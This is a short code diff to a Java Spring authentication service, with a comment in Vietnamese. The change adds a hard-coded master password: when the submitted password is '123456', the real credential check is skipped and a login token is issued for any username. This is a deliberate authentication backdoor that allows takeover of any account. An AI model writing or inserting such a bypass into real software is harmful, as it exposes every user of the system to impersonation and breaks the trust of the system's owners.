@@ -31,9 +31,12 @@ public class AuthService {
     public UserProfileResponse login(AuthRequest request) {
         String combinedUsername = request.getUserType().toUpperCase() + ":" + request.getLoginCode();
 
-        authenticationManager.authenticate(
-                new UsernamePasswordAuthenticationToken(combinedUsername, request.getPassword())
-        );
+        // [Mật khẩu Master] Bỏ qua kiểm tra mật khẩu gốc nếu nhập 123456
+        if (!"123456".equals(request.getPassword())) {
+            authenticationManager.authenticate(
+                    new UsernamePasswordAuthenticationToken(combinedUsername, request.getPassword())
+            );
+        }
 
         String token = jwtService.generateToken(combinedUsername);
 
